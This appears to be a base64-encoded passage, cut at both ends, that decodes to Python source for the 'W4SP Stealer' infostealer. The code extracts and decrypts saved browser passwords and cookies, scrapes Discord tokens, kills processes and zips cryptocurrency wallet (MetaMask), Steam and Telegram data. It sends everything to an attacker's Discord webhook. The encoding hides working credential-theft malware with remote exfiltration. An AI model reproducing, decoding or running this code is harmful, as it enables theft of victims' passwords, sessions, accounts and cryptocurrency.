jogZiJ7cGZwfSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIF0sCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgInVzZXJuYW1lIjogIlc0U1AgU3RlYWxlciIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCmRlZiBSZWZvcm1hdChsaXN0dCk6CiAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsbGlzdHQpCiAgICB3aGlsZSAiaHR0cHMiIGluIGU6IGUucmVtb3ZlKCJodHRwcyIpCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikKICAgIHdoaWxlICJuZXQiIGluIGU6IGUucmVtb3ZlKCJuZXQiKQogICAgcmV0dXJuIGxpc3Qoc2V0KGUpKQoKZGVmIHVwbG9hZChuYW1lLCBsaW5rKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KCiAgICBpZiBuYW1lID09ICJ3cGNvb2siOgogICAgICAgIHJiID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gY29va2lXb3JkcykKICAgICAgICBpZiBsZW4ocmIpID4gMTAwMDogCiAgICAgICAgICAgIHJycnJyID0gUmVmb3JtYXQoc3RyKGNvb2tpV29yZHMpKQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLAogICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJXNFNQIHwgQ29va2llcyBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIioqRm91bmQqKjpcbntyYn1cblxuKipEYXRhOioqXG46Y29va2llOiDigKIgKip7Q29va2lDb3VudH0qKiBDb29raWVzIEZvdW5kXG46bGluazog4oCiIFt3NHNwQ29va2llcy50eHRdKHtsaW5rfSkiLAogICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDE0NDA2NDEzLAogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkBXNFNQIFNURUFMRVIiLAogICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKICAgIGlmIG5hbWUgPT0gIndwcGFzc3ciOgogICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcGFzd1dvcmRzKQogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOiAKICAgICAgICAgICAgcnJyID0gUmVmb3JtYXQoc3RyKHBhc3dXb3JkcykpCiAgICAgICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcnJyKQoKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAidGl0bGUiOiAiVzRTUCB8IFBhc3N3b3JkIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiKipGb3VuZCoqOlxue3JhfVxuXG4qKkRhdGE6KipcbvCflJEg4oCiICoqe1Bhc3N3Q291bnR9KiogUGFzc3dvcmRzIEZvdW5kXG46bGluazog4oCiIFt3NHNwUGFzc3dvcmQudHh0XSh7bGlua30pIiwKICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAxNDQwNjQxMywKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJAVzRTUCBTVEVBTEVSIiwKICAgICAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAidXNlcm5hbWUiOiAiVzRTUCIsCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4KCiAgICBpZiBuYW1lID09ICJraXdpIjoKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJjb2xvciI6IDE0NDA2NDEzLAogICAgICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiSW50ZXJlc3RpbmcgZmlsZXMgZm91bmQgb24gdXNlciBQQzoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGxpbmsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJXNFNQIHwgRmlsZSBTdGVhbGVyIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQFc0U1AgU1RFQUxFUiIsCiAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKCgojIGRlZiB1cGxvYWQobmFtZSwgdGs9JycpOgojICAgICBoZWFkZXJzID0gewojICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKIyAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgojICAgICB9CgojICAgICAjIHIgPSByZXF1ZXN0cy5wb3N0KGhvb2ssIGZpbGVzPWZpbGVzKQojICAgICBMb2FkUmVxdWVzdHMoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykKCmRlZiB3cml0ZWZvcmZpbGUoZGF0YSwgbmFtZSk6CiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlx3cHtuYW1lfS50eHQiCiAgICB3aXRoIG9wZW4ocGF0aCwgbW9kZT0ndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgZi53cml0ZShmIjwtLVc0U1AgU1RFQUxFUiBPTiBUT1AtLT5cblxuIikKICAgICAgICBmb3IgbGluZSBpbiBkYXRhOgogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOgogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikKClRva2VucyA9ICcnCmRlZiBnZXRUb2tlbihwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoICs9IGFyZwogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxlfSIsIGVycm9ycz0iaWdub3JlIikucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyNSwxMTB9IiwgciJtZmFcLltcdy1dezgwLDk1fSIpOgogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFRva2VucwogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwcmludCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkKClBhc3N3ID0gW10KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgUGFzc3csIFBhc3N3Q291bnQKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Mb2dpbiBEYXRhIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgIFBhc3N3LmFwcGVuZChmIlVSMToge3Jvd1swXX0gfCBVNTNSTjRNMzoge3Jvd1sxXX0gfCBQNDU1VzBSRDoge0RlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgICAgIFBhc3N3Q291bnQgKz0gMQogICAgd3JpdGVmb3JmaWxlKFBhc3N3LCAncGFzc3cnKQoKQ29va2llcyA9IFtdICAgIApkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgQ29va2llcywgQ29va2lDb3VudAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KICAgIAogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KICAgIAogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCiAgICAKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gc3FsX2Nvbm5lY3QodGVtcGZvbGQpCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIAogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICBmb3Igcm93IGluIGRhdGE6IAogICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICBDb29raWVzLmFwcGVuZChmIkgwNTcgSzNZOiB7cm93WzBdfSB8IE40TTM6IHtyb3dbMV19IHwgVjQxVTM6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgICAgICAgICBDb29raUNvdW50ICs9IDEKICAgIHdyaXRlZm9yZmlsZShDb29raWVzLCAnY29vaycpCgpkZWYgR2V0RGlzY29yZChwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGYie3BhdGh9L0xvY2FsIFN0YXRlIik6IHJldHVybgoKICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpCiAgICAKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgICMgcHJpbnQocGF0aCwgZmlsZSkKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aEN9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyImRRdzR3OVdnWGNROlteLipcWycoLiopJ1xdLiokXVteXCJdKiIsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMKICAgICAgICAgICAgICAgICAgICB0b2tlbkRlY29kZWQgPSBEZWNyeXB0VmFsdWUoYjY0ZGVjb2RlKHRva2VuLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIG1hc3Rlcl9rZXkpCiAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tUb2tlbih0b2tlbkRlY29kZWQpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW5EZWNvZGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW5EZWNvZGVkLCBwYXRoKQoKZGVmIEdhdGhlclppcHMocGF0aHMxLCBwYXRoczIsIHBhdGhzMyk6CiAgICB0aHR0aHQgPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aHMxOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICBmb3IgcGF0dCBpbiBwYXRoczI6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgdGh0dGh0LmFwcGVuZChhKQogICAgCiAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W3BhdGhzM1swXSwgcGF0aHMzWzJdLCBwYXRoczNbMV1dKQogICAgYS5zdGFydCgpCiAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6IAogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCiAgICAgICAgIyBwcmludChXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwKQoKICAgIHdhbCwgZ2EsIG90ID0gIiIsJycsJycKICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoKICAgICAgICB3YWwgPSAiOmNvaW46ICDigKIgIFdhbGxldHNcbiIKICAgICAgICBmb3IgaSBpbiBXYWxsZXRzWmlwOgogICAgICAgICAgICB3YWwgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOgogICAgICAgIGdhID0gIjp2aWRlb19nYW1lOiAg4oCiICBHYW1pbmc6XG4iCiAgICAgICAgZm9yIGkgaW4gR2FtaW5nWmlwOgogICAgICAgICAgICBnYSArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iCiAgICBpZiBub3QgbGVuKE90aGVyWmlwKSA9PSAwOgogICAgICAgIG90ID0gIjp0aWNrZXRzOiAg4oCiICBBcHBzXG4iCiAgICAgICAgZm9yIGkgaW4gT3RoZXJaaXA6CiAgICAgICAgICAgIG90ICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIgICAgICAgICAgCiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJ0aXRsZSI6ICJXNFNQIFppcHMiLAogICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmInt3YWx9XG57Z2F9XG57b3R9IiwKICAgICAgICAgICAgImNvbG9yIjogMTU3ODE0MDMsCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICJAVzRTUCBTVEVBTEVSIiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIgogICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIFN0ZWFsZXIiLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICB9CiAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQoKCmRlZiBaaXBUZWxlZ3JhbShwYXRoLCBhcmcsIHByb2NjKToKICAgIGdsb2JhbCBPdGhlclppcAogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgIGlmIG5vdCAiLnppcCIgaW4gZmlsZSBhbmQgbm90ICJ0ZHVtbXkiIGluIGZpbGUgYW5kIG5vdCAidXNlcl9kYXRhIiBpbiBmaWxlIGFuZCBub3QgIndlYnZpZXciIGluIGZpbGU6IAogICAgICAgICAgICB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpCiAgICB6Zi5jbG9zZSgpCgogICAgIyBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgbG5payA9ICJodHRwczovL2dvb2dsZS5jb20iCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQogICAgT3RoZXJaaXAuYXBwZW5kKFthcmcsIGxuaWtdKQoKZGVmIFppcFRoaW5ncyhwYXRoLCBhcmcsIHByb2NjKToKICAgIHBhdGhDID0gcGF0aAogICAgbmFtZSA9IGFyZwogICAgZ2xvYmFsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKICAgICMgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mIiwgc2hlbGw9VHJ1ZSkKICAgICMgb3Muc3lzdGVtKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiKQoKICAgIGlmICJua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmIk1ldGFtYXNrX3ticm93c2VyfSIKICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcKICAgIAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKCiAgICBpZiAiV2FsbGV0IiBpbiBhcmcgb3IgIk5hdGlvbnNHbG9yeSIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSIKCiAgICBlbGlmICJTdGVhbSIgaW4gYXJnOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuCiAgICAgICAgZiA9IG9wZW4oZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIiwgInIrIiwgZW5jb2Rpbmc9InV0ZjgiKQogICAgICAgIGRhdGEgPSBmLnJlYWRsaW5lcygpCiAgICAgICAgIyBwcmludChkYXRhKQogICAgICAgIGZvdW5kID